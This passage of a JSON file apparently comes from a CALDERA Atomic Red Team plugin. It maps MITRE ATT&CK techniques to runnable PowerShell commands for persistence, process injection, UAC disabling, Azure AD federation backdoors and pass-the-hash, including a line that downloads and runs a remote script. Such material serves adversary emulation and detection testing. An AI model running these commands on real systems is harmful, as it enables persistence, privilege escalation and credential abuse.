            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore",
                    "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1f15ab22c39a9b6bb2bb0d77276dfcb3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1f15ab22c39a9b6bb2bb0d77276dfcb3"
    },
    "T1484.002__multiple__Domain Trust Modification__776315112cd7318c4afd38f7847465fb": {
        "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1484.002",
            "name": "Domain Trust Modification"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "try {;   Import-Module AzureAD -ErrorAction Ignore;   $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword;   Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null;   Remove-AzureADDomain -Name \"contoso.com\" -ErrorAction Ignore; } catch {}",
                    "command": "Import-Module AzureAD; Import-Module AADInternals; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword; try {;   Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null; }; catch {;   Write-Host \"Error: AzureAD could not connect\";   exit 1; }; try {;   $domain = Get-AzureADDomain -Name \"contoso.com\"; }; catch {;   Write-Host \"Error: domain \"\"contoso.com\"\" not found\";   exit 1; }; if (-Not $domain.IsVerified) {;   Write-Host \"Error: domain \"\"contoso.com\"\" not verified\";   exit 1; }; if ($domain.AuthenticationType -eq \"Federated\") {;   Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\";   exit 1; }; $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential; if (-Not $at) {;   Write-Host \"Error: AADInternals could not connect\";   exit 1; }; $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"; if ($new) {;   Write-Host \"Federation successfully added to Azure AD\";   Write-Host $new; }; else {;   Write-Host \"The federation setup failed\"; }; Write-Host \"End of federation configuration.\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "776315112cd7318c4afd38f7847465fb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "776315112cd7318c4afd38f7847465fb"
    },
    "T1574.008__multiple__Hijack Execution Flow: Path Interception by Search Order Hijacking__e538e0ff74962aaf1dbd08baa5c7853f": {
        "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.008",
            "name": "Hijack Execution Flow: Path Interception by Search Order Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore; Stop-Process -Name \"calculator\"",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"; Powershell -noprofile",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e538e0ff74962aaf1dbd08baa5c7853f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e538e0ff74962aaf1dbd08baa5c7853f"
    },
    "T1055.012__multiple__Process Injection: Process Hollowing__5fef676a9954938537bd1e2191d3e9b5": {
        "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.012",
            "name": "Process Injection: Process Hollowing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"notepad\" -ErrorAction Ignore",
                    "command": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5fef676a9954938537bd1e2191d3e9b5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5fef676a9954938537bd1e2191d3e9b5"
    },
    "T1134.004__multiple__Access Token Manipulation: Parent PID Spoofing__d0966749d457cb6218a8cd5ee5128ea2": {
        "description": "Spawns a powershell.exe process as a child of the current process.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.004",
            "name": "Access Token Manipulation: Parent PID Spoofing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d0966749d457cb6218a8cd5ee5128ea2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d0966749d457cb6218a8cd5ee5128ea2"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__9b74d10b3164f13d357830d1a6ee334a": {
        "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name \"socks5_powershell\" -Force -ErrorAction Ignore",
                    "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9b74d10b3164f13d357830d1a6ee334a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9b74d10b3164f13d357830d1a6ee334a"
    },
    "T1497.001__multiple__Virtualization/Sandbox Evasion: System Checks__e9e69b4fedb8e40d634865ce9a3192dc": {
        "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$error.clear()",
                    "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e9e69b4fedb8e40d634865ce9a3192dc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e9e69b4fedb8e40d634865ce9a3192dc"
    },
    "T1574.012__multiple__Hijack Execution Flow: COR_PROFILER__07b384a102f27412c1475421f4534f29": {
        "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore ; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
                    "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan; New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null; Write-Host \"executing eventvwr.msc\" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "07b384a102f27412c1475421f4534f29",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "07b384a102f27412c1475421f4534f29"
    },
    "T1546__multiple__Event Triggered Execution__50a9be8bbff4d4ffe0b699cb8d040c6d": {
        "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546",
            "name": "Event Triggered Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
                    "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "50a9be8bbff4d4ffe0b699cb8d040c6d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "50a9be8bbff4d4ffe0b699cb8d040c6d"
    },
    "T1546.011__multiple__Event Triggered Execution: Application Shimming__a967003ff25bdd94030cdd885feb25d7": {
        "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.011",
            "name": "Event Triggered Execution: Application Shimming"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore; Remove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore",
                    "command": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a967003ff25bdd94030cdd885feb25d7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a967003ff25bdd94030cdd885feb25d7"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__e7d20e7f0087f8a4234c1d1b7a228bb0": {
        "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force",
                    "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e7d20e7f0087f8a4234c1d1b7a228bb0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e7d20e7f0087f8a4234c1d1b7a228bb0"
    },
    "T1546.003__multiple__Event Triggered Execution: Windows Management Instrumentation Event Subscription__938a659c52ed102a8b35c7b1bb49eb11": {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "938a659c52ed102a8b35c7b1bb49eb11",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "938a659c52ed102a8b35c7b1bb49eb11"
    },
    "T1546.009__multiple__Event Triggered Execution: AppCert DLLs__5d4905a2f789ff40c53b1ea8ee53df3d": {
        "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.009",
            "name": "Event Triggered Execution: AppCert DLLs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f; Remove-Item C:\\Users\\Public\\AtomicTest.dll -Force; Remove-Item C:\\Users\\Public\\AtomicTest.txt -Force",
                    "command": "Copy-Item \"7e8ee7_AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; if($false){Restart-Computer}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "7e8ee7_AtomicTest.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "5d4905a2f789ff40c53b1ea8ee53df3d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5d4905a2f789ff40c53b1ea8ee53df3d"
    },
    "T1053.005__multiple__Scheduled Task/Job: Scheduled Task__ba8ddc38c7c6ced12fecc0d695c5e57c": {
        "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1",
                    "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ba8ddc38c7c6ced12fecc0d695c5e57c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ba8ddc38c7c6ced12fecc0d695c5e57c"
    },
    "T1055.001__multiple__Process Injection: Dynamic-link Library Injection__3b22226d4454aff3f0ea046bbe637e77": {
        "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$mypid =; mavinject $mypid /INJECTRUNNING \"#{dll_payload}\"; Stop-Process -processname notepad",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b22226d4454aff3f0ea046bbe637e77",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3b22226d4454aff3f0ea046bbe637e77"
    },
    "T1550.002__multiple__Use Alternate Authentication Material: Pass the Hash__8ce073cf3170576e1f5c6e4d06e1873a": {
        "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.002",
            "name": "Use Alternate Authentication Material: Pass the Hash"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ce073cf3170576e1f5c6e4d06e1873a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8ce073cf3170576e1f5c6e4d06e1873a"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__0a3220a423ed7c7804af6e3587ad8811": {
        "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\"",
                    "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0a3220a423ed7c7804af6e3587ad8811",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0a3220a423ed7c7804af6e3587ad8811"
    },
    "T1134.004__multiple__Access Token Manipulation: Parent PID Spoofing__4e9bac619326378b219b3635c9a91b94": {
        "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.004",
            "name": "Access Token Manipulation: Parent PID Spoofing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4e9bac619326378b219b3635c9a91b94",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4e9bac619326378b219b3635c9a91b94"
    },
    "T1546.015__multiple__Event Triggered Execution: Component Object Model Hijacking__2db3b2385ba856424bfe130f69fc0529": {
        "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f",
